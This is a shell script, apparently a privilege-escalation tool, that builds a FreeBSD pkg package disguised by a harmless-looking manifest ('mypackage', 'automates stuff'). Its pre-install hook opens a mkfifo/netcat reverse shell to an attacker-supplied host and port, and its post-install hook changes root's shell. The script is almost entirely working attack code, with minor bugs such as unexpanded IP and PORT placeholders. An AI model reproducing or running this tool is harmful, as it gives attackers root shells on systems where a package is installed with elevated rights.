#!/bin/sh


echo ":::::::, ::   ::   ,::::::, "
echo "::     ; ::   ::  ::     :: "
echo ":::::::' ::  ::  ::      :: "
echo "::       :::::   ::         "
echo "::       ::  ::  ::    :::::"
echo "::       ::   ::  ::     :: "
echo "::       ::   ::   '::::::: "


if [ $# -eq 0 ]
  then
    echo "No arguments supplied"
    echo "[+]Usage: ./pkg_priv_esc.sh <LHOST> <LPORT>"
    exit
fi


IP=$1
PORT=$2

STAGEDIR=/tmp/package
rm -rf ${STAGEDIR}
mkdir -p ${STAGEDIR}
cat >> ${STAGEDIR}/+PRE_INSTALL <<EOF
# careful here, this may clobber your system
echo "Resetting root shell"
rm /tmp/a;mkfifo /tmp/a;cat /tmp/a|/bin/sh -i 2>&1|nc IP PORT >/tmp/a
EOF
cat >> ${STAGEDIR}/+POST_INSTALL <<EOF
# careful here, this may clobber your system
echo"Registering root shell"
pw usermod -n root -s /bin/sh
EOF
cat >> ${STAGEDIR}/+MANIFEST <<EOF
name: mypackage
version:"1.0_5"
origin: sysutils/mypackage
comment: "automates stuff"
desc: "automates tasks which can also be undone later"
maintainer: Ki11i0@n4i.re
www: https://kill.io
prefix: /
EOF
pkg create -m ${STAGEDIR}/ -r ${STAGEDIR}/ -o .
